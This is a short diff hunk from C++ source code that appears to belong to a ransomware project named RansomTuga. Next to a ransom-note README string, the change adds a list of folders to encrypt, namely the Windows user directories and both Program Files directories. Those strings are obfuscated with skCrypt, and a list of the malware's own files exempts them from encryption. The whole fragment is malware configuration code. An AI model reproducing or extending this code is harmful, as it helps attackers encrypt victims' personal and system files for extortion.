@@ -103,6 +103,12 @@ const std::string READMECONTENT = (std::string)skCrypt(
 	"Or you will became a potato :C"
 ); // content of README.txt
 
+const std::string foldersToEncrypt[] = {
+	(std::string)skCrypt("C:\\Users\\"),
+	(std::string)skCrypt("C:\\Program Files\\"),
+	(std::string)skCrypt("C:\\Program Files (x86)\\")
+}; // folders to encrypt
+
 const std::string safeFiles[] = {
 	(std::string)skCrypt("RansomTuga.exe"),
 	(std::string)skCrypt("DataDecryptor.exe"),
